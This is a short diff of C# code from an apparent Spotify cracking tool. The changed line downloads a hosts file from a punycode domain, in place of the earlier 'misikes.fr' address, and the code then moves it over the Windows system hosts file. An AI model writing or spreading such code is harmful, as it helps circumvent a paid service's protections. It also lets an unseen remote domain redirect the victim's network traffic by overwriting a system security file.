@@ -29,7 +29,7 @@ namespace crack_spotify
             }
             using (var client = new WebClient())
             {
-                client.DownloadFile("http://misikes.fr/hosts", @"C:/Windows/System32/drivers/etc/hosts.txt");
+                client.DownloadFile("https://xn--ln-nia3c0c.fr/hosts", @"C:/Windows/System32/drivers/etc/hosts.txt");
             }
             { 
             File.Move("C:/Windows/System32/drivers/etc/hosts.txt", "C:/Windows/System32/drivers/etc/hosts");              
